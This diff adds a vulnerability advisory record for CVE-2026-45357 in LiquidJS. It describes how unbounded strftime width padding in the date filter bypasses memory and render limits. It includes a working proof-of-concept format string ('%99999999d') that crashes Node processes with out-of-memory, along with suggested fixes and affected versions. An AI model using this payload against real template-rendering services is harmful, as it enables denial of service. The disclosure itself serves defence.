@@ -1,0 +1,386 @@
+advisory_id: GHSA-hh27-hf48-9f5q
+datasource_id: github_osv/GHSA-hh27-hf48-9f5q
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-hh27-hf48-9f5q/GHSA-hh27-hf48-9f5q.json
+aliases:
+  - CVE-2026-45357
+summary: |
+  LiquidJS has a memory and render limit bypass via unbounded width padding in `date` filter (strftime)
+  ## Summary
+
+  The `date` filter's strftime implementation parses width specifiers like `%9999999d` and forwards the captured width unchecked into `pad()`/`padStart()` in `src/util/underscore.ts`. The pad loop performs unbounded string concatenation without consulting the Context's `memoryLimit` or `renderLimit`, so a single small template (`{{ x | date: '%5000000d' }}`) produces megabytes of output and unbounded CPU. The `memoryLimit` and `renderLimit` options the docs (`src/liquid-options.ts:87-92`) advertise as DoS controls — and which the docstring explicitly mentions for `strftime` — are entirely bypassed.
+
+  ## Details
+
+  `date.ts:5-13` only charges `memoryLimit` for the lengths of the input value, format string, and timezone:
+
+  ```ts
+  export function date (this: FilterImpl, v: string | Date, format?: string, timezoneOffset?: number | string) {
+    const size = ((v as string)?.length ?? 0) + (format?.length ?? 0) + ((timezoneOffset as string)?.length ?? 0)
+    this.context.memoryLimit.use(size)
+    ...
+    return strftime(date, format)
+  }
+  ```
+
+  `strftime` (`src/util/strftime.ts:121`) then walks the format with `rFormat = /%([-_0^#:]+)?(\d+)?([EO])?(.)/`. The captured `width` group is passed directly to `padStart`:
+
+  ```ts
+  function format (d, match) {
+    const [input, flagStr = '', width, modifier, conversion] = match
+    ...
+    let padWidth = width || padWidths[conversion] || 0
+    ...
+    return padStart(ret, padWidth, padChar)   // strftime.ts:147
+  }
+  ```
+
+  `padStart` calls `pad()` in `src/util/underscore.ts:153`:
+
+  ```ts
+  export function pad (str, length, ch, add) {
+    str = String(str)
+    let n = length - str.length
+    while (n-- > 0) str = add(str, ch)   // unbounded loop
+    return str
+  }
+  ```
+
+  The loop has no upper bound and never consults `this.context.memoryLimit` or `renderLimit`. The pad is also implemented as repeated `ch + str` string concatenation, which makes the per-byte cost grow with output length and amplifies CPU consumption.
+
+  Filter arguments accept context-evaluated values (`src/template/filter.ts:30-31`, `evalToken(arg, context)`), so any deployment that passes a context value as the date format — a documented and tested usage pattern — exposes the sink to attacker-controlled input.
+
+  This is a separate sink from the previously-reported quadratic `replace` finding: a different filter (`date`), a different parser (the strftime width regex), and a different concatenation site (`pad()` in `underscore.ts`).
+
+  ## PoC
+
+  Setup: `npm install liquidjs@10.25.7`.
+
+  Step 1 — bypass `memoryLimit` and `renderLimit` (5 MB output, ~200 ms, both limits set to 50):
+
+  ```bash
+  node -e "
+  const { Liquid } = require('liquidjs');
+  const liquid = new Liquid({ memoryLimit: 50, renderLimit: 50 });
+  const t0 = Date.now();
+  const out = liquid.parseAndRenderSync('{{ d | date: f }}', { d: 'now', f: '%5000000d' });
+  console.log('len=', out.length, 'ms=', Date.now()-t0);
+  "
+  ```
+
+  Verified output: `len= 5000000 ms= 198`. The `memoryLimit:50` (50-byte budget) and `renderLimit:50` (50 ms budget) are both ignored.
+
+  Step 2 — OOM-kill the Node process under a 200 MB heap cap:
+
+  ```bash
+  node --max-old-space-size=200 -e "
+  const { Liquid } = require('liquidjs');
+  const liquid = new Liquid({ memoryLimit: 50, renderLimit: 50 });
+  liquid.parseAndRenderSync('{{ d | date: f }}', { d: 'now', f: '%99999999d' });
+  "
+  ```
+
+  Verified output: `FATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory`. Process is killed.
+
+  The realistic attack template is `{{ post.created_at | date: user_supplied_format }}`, where `user_supplied_format` is any context value an attacker can influence (profile field, query param mapped into template context, etc.).
+
+  ## Impact
+
+  - DoS against any LiquidJS-rendered surface where a context value reaches the `date` filter's format argument: a single render call can be turned into multi-MB allocations and seconds of CPU per request, or into an OOM that crashes the host process.
+  - Bypass of the engine's two documented DoS controls — `memoryLimit` and `renderLimit` — meaning that operators who explicitly opted into DoS protection still have no defense for this code path.
+  - All `date_to_xmlschema`, `date_to_rfc822`, `date_to_string`, `date_to_long_string` paths share the same sink via `strftime`, but with hard-coded formats they're not directly attacker-controllable; the user-facing risk is on `date`.
+
+  ## Recommended Fix
+
+  Two complementary fixes:
+
+  1. Have `pad()` in `src/util/underscore.ts` charge the Context's memory limit and use `String.prototype.repeat` instead of an O(n) concatenation loop. Since `pad()` is generic, the simplest version takes the memory limit as a parameter:
+
+  ```ts
+  export function pad (str: any, length: number, ch: string, add: (str: string, ch: string) => string) {
+    str = String(str)
+    const n = length - str.length
+    if (n <= 0) return str
+    return add === ((s, c) => c + s)
+      ? ch.repeat(n) + str
+      : str + ch.repeat(n)
+  }
+  ```
+
+  2. Cap `padWidth` in `src/util/strftime.ts:141` and account for it via `memoryLimit`. The `date` filter (`src/filters/date.ts`) should also charge `this.context.memoryLimit.use(parsedMaxWidth)` before invoking `strftime`, e.g. by scanning the format for `%(\d+)` widths and summing them. A conservative cap (e.g. `Math.min(width, 1024)` for non-`N` conversions) is also reasonable — strftime widths beyond a few dozen characters have no legitimate use.
+
+  Both fixes are needed: the cap stops the OOM crash, the memory accounting restores the documented DoS guarantee.
+impacted_packages:
+  - purl: pkg:npm/liquidjs
+    affected_versions: vers:npm/<=10.25.7
+    fixed_versions:
+    affected_packages:
+      - pkg:npm/liquidjs@1.9.1
+      - pkg:npm/liquidjs@1.9.2
+      - pkg:npm/liquidjs@1.9.3
+      - pkg:npm/liquidjs@1.9.4
+      - pkg:npm/liquidjs@1.9.5
+      - pkg:npm/liquidjs@1.9.6
+      - pkg:npm/liquidjs@1.9.7
+      - pkg:npm/liquidjs@2.0.0
+      - pkg:npm/liquidjs@2.0.1
+      - pkg:npm/liquidjs@2.0.2
+      - pkg:npm/liquidjs@2.0.3
+      - pkg:npm/liquidjs@2.1.0
+      - pkg:npm/liquidjs@2.1.1
+      - pkg:npm/liquidjs@2.1.2
+      - pkg:npm/liquidjs@2.1.3
+      - pkg:npm/liquidjs@2.1.4
+      - pkg:npm/liquidjs@2.2.0
+      - pkg:npm/liquidjs@2.2.1
+      - pkg:npm/liquidjs@3.0.0
+      - pkg:npm/liquidjs@3.1.0
+      - pkg:npm/liquidjs@3.1.1
+      - pkg:npm/liquidjs@3.1.2
+      - pkg:npm/liquidjs@3.1.3
+      - pkg:npm/liquidjs@4.0.0
+      - pkg:npm/liquidjs@5.0.0
+      - pkg:npm/liquidjs@5.0.1
+      - pkg:npm/liquidjs@5.0.2
+      - pkg:npm/liquidjs@5.1.0
+      - pkg:npm/liquidjs@5.1.1
+      - pkg:npm/liquidjs@5.2.0
+      - pkg:npm/liquidjs@5.3.0-0
+      - pkg:npm/liquidjs@6.0.0
+      - pkg:npm/liquidjs@6.0.1
+      - pkg:npm/liquidjs@6.1.0
+      - pkg:npm/liquidjs@6.1.1
+      - pkg:npm/liquidjs@6.2.0
+      - pkg:npm/liquidjs@6.2.1
+      - pkg:npm/liquidjs@6.3.0
+      - pkg:npm/liquidjs@6.4.0
+      - pkg:npm/liquidjs@6.4.1
+      - pkg:npm/liquidjs@6.4.2
+      - pkg:npm/liquidjs@6.4.3
+      - pkg:npm/liquidjs@7.0.0
+      - pkg:npm/liquidjs@7.0.1
+      - pkg:npm/liquidjs@7.0.2
+      - pkg:npm/liquidjs@7.1.0
+      - pkg:npm/liquidjs@7.2.0
+      - pkg:npm/liquidjs@7.2.1
+      - pkg:npm/liquidjs@7.2.2
+      - pkg:npm/liquidjs@7.3.0
+      - pkg:npm/liquidjs@7.3.1
+      - pkg:npm/liquidjs@7.4.0
+      - pkg:npm/liquidjs@7.5.0
+      - pkg:npm/liquidjs@7.5.1
+      - pkg:npm/liquidjs@8.0.0
+      - pkg:npm/liquidjs@8.0.1
+      - pkg:npm/liquidjs@8.0.2
+      - pkg:npm/liquidjs@8.0.3
+      - pkg:npm/liquidjs@8.1.0
+      - pkg:npm/liquidjs@8.2.0
+      - pkg:npm/liquidjs@8.2.1
+      - pkg:npm/liquidjs@8.2.2
+      - pkg:npm/liquidjs@8.2.3
+      - pkg:npm/liquidjs@8.2.4
+      - pkg:npm/liquidjs@8.3.0
+      - pkg:npm/liquidjs@8.4.0
+      - pkg:npm/liquidjs@8.4.1
+      - pkg:npm/liquidjs@8.5.0
+      - pkg:npm/liquidjs@8.5.1
+      - pkg:npm/liquidjs@8.5.2
+      - pkg:npm/liquidjs@8.5.3
+      - pkg:npm/liquidjs@9.0.0
+      - pkg:npm/liquidjs@9.0.1
+      - pkg:npm/liquidjs@9.1.0
+      - pkg:npm/liquidjs@9.1.1
+      - pkg:npm/liquidjs@9.2.0
+      - pkg:npm/liquidjs@9.3.0
+      - pkg:npm/liquidjs@9.3.1
+      - pkg:npm/liquidjs@9.4.0
+      - pkg:npm/liquidjs@9.4.1
+      - pkg:npm/liquidjs@9.4.2
+      - pkg:npm/liquidjs@9.5.0
+      - pkg:npm/liquidjs@9.6.0
+      - pkg:npm/liquidjs@9.6.1
+      - pkg:npm/liquidjs@9.6.2
+      - pkg:npm/liquidjs@9.7.0
+      - pkg:npm/liquidjs@9.7.1
+      - pkg:npm/liquidjs@9.7.2
+      - pkg:npm/liquidjs@9.8.0
+      - pkg:npm/liquidjs@9.9.0
+      - pkg:npm/liquidjs@9.10.0
+      - pkg:npm/liquidjs@9.11.0
+      - pkg:npm/liquidjs@9.11.1
+      - pkg:npm/liquidjs@9.11.2
+      - pkg:npm/liquidjs@9.11.3
+      - pkg:npm/liquidjs@9.11.4
+      - pkg:npm/liquidjs@9.11.5
+      - pkg:npm/liquidjs@9.11.6
+      - pkg:npm/liquidjs@9.11.7
+      - pkg:npm/liquidjs@9.11.8
+      - pkg:npm/liquidjs@9.11.9
+      - pkg:npm/liquidjs@9.11.10
+      - pkg:npm/liquidjs@9.11.11
+      - pkg:npm/liquidjs@9.12.0
+      - pkg:npm/liquidjs@9.13.0
+      - pkg:npm/liquidjs@9.14.0
+      - pkg:npm/liquidjs@9.14.1
+      - pkg:npm/liquidjs@9.15.0
+      - pkg:npm/liquidjs@9.15.1
+      - pkg:npm/liquidjs@9.16.0
+      - pkg:npm/liquidjs@9.16.1
+      - pkg:npm/liquidjs@9.17.0
+      - pkg:npm/liquidjs@9.18.0
+      - pkg:npm/liquidjs@9.19.0
+      - pkg:npm/liquidjs@9.20.0
+      - pkg:npm/liquidjs@9.20.1
+      - pkg:npm/liquidjs@9.21.0
+      - pkg:npm/liquidjs@9.22.0
+      - pkg:npm/liquidjs@9.22.1
+      - pkg:npm/liquidjs@9.23.0
+      - pkg:npm/liquidjs@9.23.1
+      - pkg:npm/liquidjs@9.23.2
+      - pkg:npm/liquidjs@9.23.3
+      - pkg:npm/liquidjs@9.23.4
+      - pkg:npm/liquidjs@9.24.0
+      - pkg:npm/liquidjs@9.24.1
+      - pkg:npm/liquidjs@9.24.2
+      - pkg:npm/liquidjs@9.25.0
+      - pkg:npm/liquidjs@9.25.1
+      - pkg:npm/liquidjs@9.26.0
+      - pkg:npm/liquidjs@9.27.0
+      - pkg:npm/liquidjs@9.27.1
+      - pkg:npm/liquidjs@9.28.0
+      - pkg:npm/liquidjs@9.28.1
+      - pkg:npm/liquidjs@9.28.2
+      - pkg:npm/liquidjs@9.28.3
+      - pkg:npm/liquidjs@9.28.4
+      - pkg:npm/liquidjs@9.28.5
+      - pkg:npm/liquidjs@9.28.6
+      - pkg:npm/liquidjs@9.29.0
+      - pkg:npm/liquidjs@9.30.0
+      - pkg:npm/liquidjs@9.31.0
+      - pkg:npm/liquidjs@9.32.0
+      - pkg:npm/liquidjs@9.32.1
+      - pkg:npm/liquidjs@9.33.0
+      - pkg:npm/liquidjs@9.33.1
+      - pkg:npm/liquidjs@9.34.0
+      - pkg:npm/liquidjs@9.34.1
+      - pkg:npm/liquidjs@9.35.0
+      - pkg:npm/liquidjs@9.35.1
+      - pkg:npm/liquidjs@9.35.2
+      - pkg:npm/liquidjs@9.36.0
+      - pkg:npm/liquidjs@9.36.1
+      - pkg:npm/liquidjs@9.36.2
+      - pkg:npm/liquidjs@9.37.0
+      - pkg:npm/liquidjs@9.38.0
+      - pkg:npm/liquidjs@9.39.0
+      - pkg:npm/liquidjs@9.39.1
+      - pkg:npm/liquidjs@9.39.2
+      - pkg:npm/liquidjs@9.40.0
+      - pkg:npm/liquidjs@9.41.0
+      - pkg:npm/liquidjs@9.42.0
+      - pkg:npm/liquidjs@9.42.1
+      - pkg:npm/liquidjs@9.43.0
+      - pkg:npm/liquidjs@10.0.0
+      - pkg:npm/liquidjs@10.1.0
+      - pkg:npm/liquidjs@10.2.0
+      - pkg:npm/liquidjs@10.3.0
+      - pkg:npm/liquidjs@10.3.1
+      - pkg:npm/liquidjs@10.3.2
+      - pkg:npm/liquidjs@10.3.3
+      - pkg:npm/liquidjs@10.4.0
+      - pkg:npm/liquidjs@10.5.0
+      - pkg:npm/liquidjs@10.6.0
+      - pkg:npm/liquidjs@10.6.1
+      - pkg:npm/liquidjs@10.6.2
+      - pkg:npm/liquidjs@10.7.0
+      - pkg:npm/liquidjs@10.7.1
+      - pkg:npm/liquidjs@10.8.0
+      - pkg:npm/liquidjs@10.8.1
+      - pkg:npm/liquidjs@10.8.2
+      - pkg:npm/liquidjs@10.8.3
+      - pkg:npm/liquidjs@10.8.4
+      - pkg:npm/liquidjs@10.9.0
+      - pkg:npm/liquidjs@10.9.1
+      - pkg:npm/liquidjs@10.9.2
+      - pkg:npm/liquidjs@10.9.3
+      - pkg:npm/liquidjs@10.9.4
+      - pkg:npm/liquidjs@10.10.0
+      - pkg:npm/liquidjs@10.10.1
+      - pkg:npm/liquidjs@10.10.2
+      - pkg:npm/liquidjs@10.11.0
+      - pkg:npm/liquidjs@10.11.1
+      - pkg:npm/liquidjs@10.12.0
+      - pkg:npm/liquidjs@10.13.0
+      - pkg:npm/liquidjs@10.13.1
+      - pkg:npm/liquidjs@10.14.0
+      - pkg:npm/liquidjs@10.15.0
+      - pkg:npm/liquidjs@10.16.0
+      - pkg:npm/liquidjs@10.16.1
+      - pkg:npm/liquidjs@10.16.2
+      - pkg:npm/liquidjs@10.16.3
+      - pkg:npm/liquidjs@10.16.4
+      - pkg:npm/liquidjs@10.16.5
+      - pkg:npm/liquidjs@10.16.6
+      - pkg:npm/liquidjs@10.16.7
+      - pkg:npm/liquidjs@10.17.0
+      - pkg:npm/liquidjs@10.18.0
+      - pkg:npm/liquidjs@10.19.0
+      - pkg:npm/liquidjs@10.19.1
+      - pkg:npm/liquidjs@10.20.0
+      - pkg:npm/liquidjs@10.20.1
+      - pkg:npm/liquidjs@10.20.2
+      - pkg:npm/liquidjs@10.20.3
+      - pkg:npm/liquidjs@10.21.0
+      - pkg:npm/liquidjs@10.21.1
+      - pkg:npm/liquidjs@10.22.0
+      - pkg:npm/liquidjs@10.23.0
+      - pkg:npm/liquidjs@10.24.0
+      - pkg:npm/liquidjs@10.25.0
+      - pkg:npm/liquidjs@10.25.1
+      - pkg:npm/liquidjs@10.25.2
+      - pkg:npm/liquidjs@10.25.3
+      - pkg:npm/liquidjs@10.25.4
+      - pkg:npm/liquidjs@10.25.5
+      - pkg:npm/liquidjs@10.25.6
+      - pkg:npm/liquidjs@10.25.7
+    fixed_packages: []
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/harttle/liquidjs
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/harttle/liquidjs
+        commit: 3129d46dc95efa357b00e5a57ee1af80a13d72ed
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '7.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-hh27-hf48-9f5q/GHSA-hh27-hf48-9f5q.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-400
+references:
+  - url: https://github.com/harttle/liquidjs
+    reference_type:
+    reference_id:
+  - url: https://github.com/harttle/liquidjs/releases/tag/v10.26.0
+    reference_type:
+    reference_id:
+  - url: https://github.com/harttle/liquidjs/security/advisories/GHSA-hh27-hf48-9f5q
+    reference_type:
+    reference_id:
+  - url: https://github.com/harttle/liquidjs/commit/3129d46dc95efa357b00e5a57ee1af80a13d72ed
+    reference_type: other
+    reference_id: 3129d46dc95efa357b00e5a57ee1af80a13d72ed
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-45357
+    reference_type:
+    reference_id: CVE-2026-45357
+exploits: []
